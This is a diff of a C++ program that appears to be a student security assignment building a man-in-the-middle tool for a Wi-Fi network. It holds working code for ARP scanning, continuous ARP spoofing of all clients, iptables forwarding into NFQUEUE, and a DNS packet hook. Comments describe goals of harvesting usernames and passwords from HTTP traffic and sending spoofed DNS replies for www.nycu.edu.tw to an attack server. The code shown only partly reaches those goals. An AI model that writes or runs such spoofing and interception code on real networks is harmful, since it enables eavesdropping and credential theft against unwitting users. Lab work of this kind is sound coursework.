@@ -20,9 +20,13 @@
 #include <net/ethernet.h>
 #include <thread>
 #include <atomic>
-#include <errno.h>
 #include <linux/netfilter.h>
 #include <libnetfilter_queue/libnetfilter_queue.h>
+#include <linux/filter.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+#include <netinet/udp.h>
+
 
 using namespace std;
 
@@ -32,22 +36,6 @@ struct id_replace
     bool replace;
 };
 
-struct arp_header
-{
-    uint16_t htype;
-    uint16_t ptype;
-    uint8_t hlen;
-    uint8_t plen;
-    uint16_t opcode;
-    uint8_t sender_mac[6];
-    uint8_t sender_ip[4];
-    uint8_t target_mac[6];
-    uint8_t target_ip[4];
-};
-// struct arp_packet {
-//     struct ethhdr eth;
-//     struct arp_header arp;
-// };
 #define ETHER_HEADER_LEN sizeof(struct ether_header)
 #define ETHER_ARP_LEN sizeof(struct ether_arp)
 #define ETHER_ARP_PACKET_LEN ETHER_HEADER_LEN + ETHER_ARP_LEN
@@ -126,37 +114,61 @@ string exec(const char *cmd){
 }
 
 map<string, string> devices;
-atomic<bool> stop_receiving(false);
 void receive_arp_reply(int sock_raw_fd)
 {
     unsigned char buffer[ETHER_ARP_PACKET_LEN];
     ssize_t length;
-    while (!stop_receiving)
+    fd_set readfds;
+    struct timeval tv;
+    int retval;
+    // Wait up to 1 seconds.
+    tv.tv_sec = 1;
+    tv.tv_usec = 0;
+
+    while (true)
     {
-        length = recvfrom(sock_raw_fd, buffer, ETHER_ARP_PACKET_LEN, 0, NULL, NULL);
-        if (length == -1)
+        FD_ZERO(&readfds);
+        FD_SET(sock_raw_fd, &readfds);
+        retval = select(sock_raw_fd + 1, &readfds, NULL, NULL, &tv);
+
+        if (retval == -1)
         {
-            cerr << "Error receiving packet." << endl;
+            cerr << "Error with select." << endl;
+            break;
+        }
+        else if (retval)
+        {
+            length = recvfrom(sock_raw_fd, buffer, ETHER_ARP_PACKET_LEN, 0, NULL, NULL);
+            if (length == -1)
+            {
+                cerr << "Error receiving packet." << endl;
+            }
+            else
+            {
+                // 解析 ARP 回覆
+                struct ether_arp *arp_resp = (struct ether_arp *)(buffer + ETHER_HEADER_LEN);
+                if (ntohs(arp_resp->arp_op) == ARPOP_REPLY)
+                {
+                    // Extract sender IP address
+                    string sender_ip_str = inet_ntoa(*(struct in_addr *)arp_resp->arp_spa);
+
+                    // Extract sender MAC address
+                    char sender_mac_str[18];
+                    sprintf(sender_mac_str, "%02x:%02x:%02x:%02x:%02x:%02x",
+                            arp_resp->arp_sha[0], arp_resp->arp_sha[1], arp_resp->arp_sha[2],
+                            arp_resp->arp_sha[3], arp_resp->arp_sha[4], arp_resp->arp_sha[5]);
+                    // add to devices
+                    devices[sender_ip_str] = sender_mac_str;
+                }
+            }
         }
         else
         {
-            // 解析 ARP 回覆
-            struct ether_arp *arp_resp = (struct ether_arp *)(buffer + ETHER_HEADER_LEN);
-            if (ntohs(arp_resp->arp_op) == ARPOP_REPLY)
-            {
-                // Extract sender IP address
-                string sender_ip_str = inet_ntoa(*(struct in_addr *)arp_resp->arp_spa);
-
-                // Extract sender MAC address
-                char sender_mac_str[18];
-                sprintf(sender_mac_str, "%02x:%02x:%02x:%02x:%02x:%02x",
-                        arp_resp->arp_sha[0], arp_resp->arp_sha[1], arp_resp->arp_sha[2],
-                        arp_resp->arp_sha[3], arp_resp->arp_sha[4], arp_resp->arp_sha[5]);
-                // add to devices
-                devices[sender_ip_str] = sender_mac_str;
-            }
+            // No data within five seconds.
+            break;
         }
     }
+
 }
 void arp_request(const char *if_name, const char *base_ip)
 {
@@ -207,7 +219,7 @@ void arp_request(const char *if_name, const char *base_ip)
             src_mac_addr[3], src_mac_addr[4], src_mac_addr[5]);
     source_mac = local_mac_str;
     // cout << "Local MAC: " << source_mac << endl;
-    thread receive_thread(receive_arp_reply, sock_raw_fd);
+    // thread receive_thread(receive_arp_reply, sock_raw_fd);
 
     for (int i = 1; i < 255; i++)
     {
@@ -230,12 +242,13 @@ void arp_request(const char *if_name, const char *base_ip)
             cerr << "Error sending packet." << endl;
         }
     }
-
-    stop_receiving = true;
-    receive_thread.join();
+    receive_arp_reply(sock_raw_fd);
+    // stop_receiving = true;
+    // receive_thread.join();
 
     close(sock_raw_fd);
 }
+
 
 void list_devices()
 {
@@ -244,9 +257,6 @@ void list_devices()
     gateway_ip.erase(gateway_ip.end() - 1);
     source_ip = exec("hostname -I");
     source_ip.erase(source_ip.end() - 1);
-    // interface = exec("ip route | grep default | awk '{print $5}'");
-    // interface.erase(interface.end() - 1);
-
     // cout << "Gateway IP: " << gateway_ip << endl;
     // cout << "Source IP: " << source_ip << endl;
     // cout << "Interface: " << interface << endl;
@@ -335,97 +345,97 @@ void keep_sending_arp_reply( unsigned char *source_mac_char, unsigned char *gate
 
 
 }
-// void arp_spoofing()
-// {
-    // string gateway_mac = devices[gateway_ip];
+
+
+
+static int dns_nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data)
+{
+    char *packet;
+    int id = 0;
+    struct nfqnl_msg_packet_hdr *ph;
+    ph = nfq_get_msg_packet_hdr(nfa);
+    if (ph)
+    {
+        id = ntohl(ph->packet_id);
+    }
+    int ret = nfq_get_payload(nfa, reinterpret_cast<unsigned char **>(&packet));
+    if (ret >= 0)
+    {
+        // dns packet use udp protocol and port 53
+        // if receive dns request to www.nycu.edu.tw, then send spoofed DNS reply with IP: 140.113.24.241
+        struct iphdr *ip_header = (struct iphdr *)packet;
+        struct udphdr *udp_header = (struct udphdr *)(packet + ip_header->ihl * 4);
+        // check if the packet is DNS request
+        if (ip_header->protocol == IPPROTO_UDP && ntohs(udp_header->dest) == 53)
+        {
+            cout << "DNS packet\n";
+            // get the DNS query
+            char *dns_query = (char *)(packet + ip_header->ihl * 4 + sizeof(struct udphdr) + 12);
+            // cout << "DNS query: " << dns_query << endl;
+            if (strstr(dns_query, "www.nycu.edu.tw") != NULL)
+            {
+                cout << "DNS query: " << dns_query << endl;
+            }
+        }
+    }
+    return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
+}
+
+void analyze_packet(){
+    // filter the received packet: HTTP
+    // continuously listen to the packets on the interface and filter the HTTP packets
+    // analyze the every received HTTP POST packet, findout the packet with "txtUsername"
+    // Set up packet capture filter to capture HTTP traffic (port 80)
+    struct nfq_handle *h;
+    struct nfq_q_handle *qh;
+    struct nfnl_handle *nh;
+    int fd;
+    int rv;
+    char buf[4096] __attribute__((aligned));
+    h = nfq_open();
+    if (!h)
+    {
+        cerr << "error during nfq_open()" << endl;
+        exit(1);
+    }
+    if (nfq_unbind_pf(h, AF_INET) < 0)
+    {
+        cerr << "error during nfq_unbind_pf()" << endl;
+        exit(1);
+    }
+    if (nfq_bind_pf(h, AF_INET) < 0)
+    {
+        cerr << "error during nfq_bind_pf()" << endl;
+        exit(1);
+    }
+    qh = nfq_create_queue(h, 0, &dns_nfq_packet_handler, NULL);
+    if (!qh)
+    {
+        cerr << "error during nfq_create_queue()" << endl;
+        exit(1);
+    }
+    if (nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff) < 0)
+    {
+        cerr << "can't set packet_copy mode" << endl;
+        exit(1);
+    }
+    fd = nfq_fd(h);
+    while ((rv = recv(fd, buf, sizeof(buf), 0)))
+    {
+        nfq_handle_packet(h, buf, rv);
+    }
+    nfq_destroy_queue(qh);
+    nfq_close(h);
+    exit(0);
+}
+
+void arp_spoofing()
+{
+    string gateway_mac = devices[gateway_ip];
     // cout << "Gateway IP: " << gateway_ip << endl;
     // cout << "Gateway MAC: " << gateway_mac << endl;
     // cout << "Source IP: " << source_ip << endl;
     // cout << "Source MAC: " << source_mac << endl;
-    // // change string of mac to unsigned char[6]
-    // unsigned char gateway_mac_char[6];
-    // sscanf(gateway_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-    //        &gateway_mac_char[0], &gateway_mac_char[1], &gateway_mac_char[2],
-    //        &gateway_mac_char[3], &gateway_mac_char[4], &gateway_mac_char[5]);
-    // // change string of mac to unsigned char[6]
-    // unsigned char source_mac_char[6];
-    // sscanf(source_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-    //        &source_mac_char[0], &source_mac_char[1], &source_mac_char[2],
-    //        &source_mac_char[3], &source_mac_char[4], &source_mac_char[5]);
-
-    // // thread to send ARP reply to gateway and victim
-    // thread arp_reply_thread(keep_sending_arp_reply, source_mac_char, gateway_mac_char);
-
-    // // dns_spoofing
-
-
-    
-
-    // arp_reply_thread.join();
-// }
-
-bool pkt_analysis(char *data, int len)
-{   
-    
-    return 0;
-}
-
-struct id_replace print_packet(struct nfq_data *tb)
-{
-    id_replace pkt;
-    struct nfqnl_msg_packet_hdr *ph;
-    int ret;
-    char *data;
-
-    ph = nfq_get_msg_packet_hdr(tb);
-    if (ph) {
-        pkt.id = ntohl(ph->packet_id);
-    }
-
-    ret = nfq_get_payload(tb, reinterpret_cast<unsigned char**>(&data)); // reinterpret
-	if (ret >= 0) {
-		pkt.replace = pkt_analysis (data, ret);
-	}
-
-	return pkt;
-}
-
-int cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data)
-{
-	id_replace pr = print_packet(nfa);
-	return nfq_set_verdict(qh, pr.id, NF_ACCEPT, 0, NULL);
-}
-
-int main()
-{   
-    interface = exec("ip route | grep default | awk '{print $5}'");
-    interface.erase(interface.end() - 1);
-    cout << interface << "\n";
-    system("sysctl -w net.ipv4.ip_forward=1 > /dev/null");
-    system("iptables -F");
-    system("iptables -F -t nat");
-
-    char cmd[100];
-    sprintf(cmd, "iptables -t nat -A POSTROUTING -o %s -j MASQUERADE", interface.c_str());
-    system(cmd);
-    system("iptables -A FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 0");
-    system("iptables -A FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0");
-    // ...
-
-    // task 1 : list all devices' IP/MAC addresses in the Wi-Fi network(except the attacker and gateway)
-    list_devices();
-
-    // task 2 : ARP spoofing for all other client devices in the Wi-Fi network
-    /*
-    Sending spoofed ARP packets to all neighbors (possible victims)
-    to trick AP we are the victim and trick the victim we are AP
-    */
-    // arp_spoofing();
-    string gateway_mac = devices[gateway_ip];
-    cout << "Gateway IP: " << gateway_ip << endl;
-    cout << "Gateway MAC: " << gateway_mac << endl;
-    cout << "Source IP: " << source_ip << endl;
-    cout << "Source MAC: " << source_mac << endl;
     // change string of mac to unsigned char[6]
     unsigned char gateway_mac_char[6];
     sscanf(gateway_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
@@ -440,69 +450,40 @@ int main()
     // thread to send ARP reply to gateway and victim
     thread arp_reply_thread(keep_sending_arp_reply, source_mac_char, gateway_mac_char);
 
-    //task 4
-    // dns_spoofing
-    struct nfq_handle *h;
-    struct nfq_q_handle *qh;
-    int fd;
-    int rv;
-    char buf[4096] __attribute__ ((aligbned));
+    // task 3 :Fetch all the inputted usernames/passwords on a specific web pag  (Parse HTTP content and print out usernames/passwords)
+    // thread analyze_thread(analyze_packet);
 
-    cout << "opening library handle\n";
-    h = nfq_open();
-    if (!h) {
-        perror("error during nfq_open: ");
-        exit(1);
-    }
-
-    cout << "unbinging\n";
-    if (nfq_unbind_pf(h, AF_INET) < 0) {
-        perror("error during unbind: ");
-        exit(1);
-    }
-
-    cout << "binding\n";
-    if (nfq_bind_pf(h, AF_INET) < 0) {
-        perror("error during binding: ");
-        exit(1);
-    }
+    // task 4 : Intercept DNS requests for a specific web page and generate spoofed DNS replies with the attack server’s IP
+    // DNS request(domain name: www.nycu.edu.tw) -> DNS reply(IP: 140.113.24.241)
+    thread analyze_thread(analyze_packet);
     
-    qh = nfq_create_queue(h, 0, &cb, NULL);
-    if (!qh) {
-        perror("error during create queue: ");
-        exit(1);
-    }
-
-    cout << "set copy packet mode\n";
-    if (nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff) < 0) {
-        perror("error during packet copy mode: ");
-        exit(1);
-    }
-
-    fd = nfq_fd(h);
-
-    for (;;) {
-        rv = recv(fd, buf, sizeof(buf), 0);
-        if (rv > 0) {
-            // cout << "pkt recv\n";
-            nfq_handle_packet(h, buf, rv);
-            continue;
-        }
-        // if (rv < 0 && errno = ENOBUFS) {
-        //     cout << "losing pkts\n";
-        //     continue;
-        // }
-        // perror("recv failed: ");
-        break;
-    }
-
-    cout << "unbinding from queue\n";
-    nfq_destroy_queue(qh);
-
-    cout << "closing library handle\n";
-    nfq_close(h);
-
 
     arp_reply_thread.join();
+    analyze_thread.join();
+
+
+}
+
+int main()
+{   
+    interface = exec("ip route | grep default | awk '{print $5}'");
+    interface.erase(interface.end() - 1);
+    // cout << interface << "\n";
+    system("sysctl -w net.ipv4.ip_forward=1 > /dev/null");
+    system("iptables -F");
+    system("iptables -F -t nat");
+
+    system("iptables -A FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 0");
+    // char cmd[100];
+    // sprintf(cmd, "iptables -t nat -A POSTROUTING -o %s -j MASQUERADE", interface.c_str());
+    // system(cmd);
+
+
+    // task 1 : list all devices' IP/MAC addresses in the Wi-Fi network(except the attacker and gateway)
+    list_devices();
+
+    // task 2 : ARP spoofing for all other client devices in the Wi-Fi network
+    arp_spoofing();
+
     return 0;
 }
